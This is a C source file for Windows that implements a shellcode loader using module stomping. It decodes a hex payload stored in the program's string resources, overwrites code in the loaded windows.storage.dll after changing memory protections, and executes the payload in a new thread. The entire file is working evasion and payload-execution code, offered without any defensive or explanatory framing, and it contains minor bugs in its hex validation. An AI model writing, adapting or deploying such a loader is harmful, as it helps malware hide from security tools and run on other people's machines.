#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#pragma comment(lib, "user32.lib")

unsigned int PAYLOAD_SIZE = 300;
const unsigned char* DLL_TARGET = "windows.storage.dll";

SIZE_T RoundUpToPage(SIZE_T size) {
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    SIZE_T pageSize = si.dwPageSize;
    return (size + pageSize - 1) & ~(pageSize - 1); // round up
}

void load(unsigned char* payload, unsigned int payload_len, unsigned char* sLib){
    // Definitions
    DWORD oldprotect = 0;
    int j = 0;
    int i = 0;
    SIZE_T allocSize;

    allocSize = RoundUpToPage(payload_len);
    
    // module stomping
    HMODULE hVictimLib = LoadLibrary((LPCSTR) sLib);
    char * ptr = (char *) hVictimLib + 2*4096 + 12;
    VirtualProtect(ptr, allocSize, PAGE_READWRITE, &oldprotect);
    // Finish stomping
    
    memcpy(ptr, payload, payload_len);
    VirtualProtect(ptr, allocSize, PAGE_EXECUTE_READ, &oldprotect);

    HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) ptr, NULL, 0, 0);
    WaitForSingleObject(th, -1);
    CloseHandle(th);
    memset(ptr, 0x0, allocSize);
}

unsigned char hex_char_to_byte(char c) {
    if ('0' <= c && c <= '9') return c - '0';
    if ('a' <= c && c <= 'f') return c - 'a' + 10;
    if ('A' <= c && c <= 'F') return c - 'A' + 10;
    return 0; // invalid input
}

// Convert hex string to bytes
size_t hexstr_to_bytes(const char *hexstr, unsigned char *out, size_t max_bytes) {
    size_t len = 0;

    while (*hexstr != '\0' && len < max_bytes) {
        char c1 = *hexstr++;
        char c2 = *hexstr++; // may be '\0' if odd-length

        unsigned char high = hex_char_to_byte(c1);
        unsigned char low  = (c2 != '\0') ? hex_char_to_byte(c2) : 0;

        if (high == 0xFF || low == 0xFF) {
            fprintf(stderr, "Invalid hex character: %c%c\n", c1, c2 ? c2 : ' ');
            break;
        }

        out[len++] = (high << 4) | low;

        // Stop if we just consumed the null terminator as second char
        if (c2 == '\0') break;
    }

    return len;
}


BOOL LoadBlobFromStringResources(HINSTANCE hInst, int startID, unsigned char *outData, DWORD *outLen) {
    size_t totalSize = 0;
    size_t allocSize = 0;
    unsigned int position = 0;
    size_t n = 0;
    unsigned char tmpBytes[300];

    for (int id = startID; ; id++) {
        CHAR tmp[601];
        int len = LoadStringA(hInst, id, tmp, sizeof(tmp));
        if (len == 0) break; // no more

        n = hexstr_to_bytes(tmp, tmpBytes, sizeof(tmpBytes));
        
        RtlMoveMemory(outData, tmpBytes, n);
        
        outData += n;
        totalSize += n;
        
    }

    //*outData = buffer;
    *outLen = (DWORD)totalSize;
    return TRUE;
}



int main(void) {
    //definitions
	HGLOBAL resHandle = NULL;
	HRSRC res;
    unsigned char * payload;
	unsigned int payload_len;

    unsigned char *data = (unsigned char*)VirtualAlloc(NULL, PAYLOAD_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    DWORD dataLen;
    
    if (LoadBlobFromStringResources(GetModuleHandle(NULL), 1, data, &dataLen)) {
        printf("data %x\n", data);
        printf("Loaded %lu bytes!\n", dataLen);
    } else {
        printf("Failed to load blob.\n");
    }

    FILE* outfile = fopen("nul", "w");

    load(data, PAYLOAD_SIZE, DLL_TARGET);
}